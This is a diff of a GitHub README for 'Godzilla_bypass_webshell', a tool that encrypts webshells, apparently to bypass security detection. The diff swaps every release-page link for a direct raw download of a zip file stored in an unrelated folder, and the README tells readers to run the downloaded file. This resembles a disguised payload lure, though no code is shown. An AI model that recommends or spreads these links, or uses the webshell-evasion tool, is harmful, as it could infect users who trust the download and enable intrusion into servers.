@@ -1,6 +1,6 @@
 # 🐉 Godzilla_bypass_webshell - Custom AES Webshell Encryption Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Use this guide to download and run Godzilla_bypass_webshell on your Windows comp
 
 Click the badge at the top or this link to open the release page:
 
-[Download Godzilla_bypass_webshell Releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+[Download Godzilla_bypass_webshell Releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip)
 
 This page holds the latest version of the software. Download the most recent stable release to get the newest features and fixes.
 
@@ -85,7 +85,7 @@ The program keeps the process straightforward. It does not require coding knowle
 
 1. Download the latest release from the release page:
 
-   [https://github.com/erikturbolt/Godzilla_bypass_webshell/releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+   [https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip](https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip)
 
 2. Run the downloaded file.
 3. Follow install prompts:
@@ -140,7 +140,7 @@ Adjust these based on your security needs.
 
 To update Godzilla_bypass_webshell, visit the release page regularly:
 
-[https://github.com/erikturbolt/Godzilla_bypass_webshell/releases](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+[https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip](https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip)
 
 Download the latest `.exe` or `.zip` and follow the installation steps to replace your current version. Backup important files before updating if needed.
 
@@ -154,4 +154,4 @@ If you encounter issues beyond these instructions, use the GitHub Issues tab in 
 
 # [Badge repeated at bottom for convenience]
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Godzilla%20Bypass-9cf?style=for-the-badge&logo=github)](https://github.com/erikturbolt/Godzilla_bypass_webshell/raw/refs/heads/main/微调模型训练/bypass-webshell-Godzilla-3.4.zip)
